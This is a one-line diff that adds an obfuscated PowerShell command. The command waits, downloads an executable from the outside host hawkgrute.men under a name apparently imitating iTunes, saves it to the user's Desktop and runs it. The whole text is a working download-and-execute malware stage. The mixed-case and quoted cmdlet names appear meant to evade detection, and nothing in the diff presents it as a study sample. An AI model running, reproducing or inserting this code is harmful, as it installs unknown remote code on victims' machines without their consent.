@@ -1,0 +1,1 @@
+$7d0mK6 = [TyPE]'ENvIronmENt' ; &'sleep' 33;${Des} = $7d0mk6::gETFoLdeRpaTh('Desktop');(&'New-Object' 'System.nEt.weBcLIEnT').dOwNLoADFile.iNvoKE('http://hawkgrute.men/iitunes','$Des\3487384.exe');&'Start-Process' $Des\3487384.exe
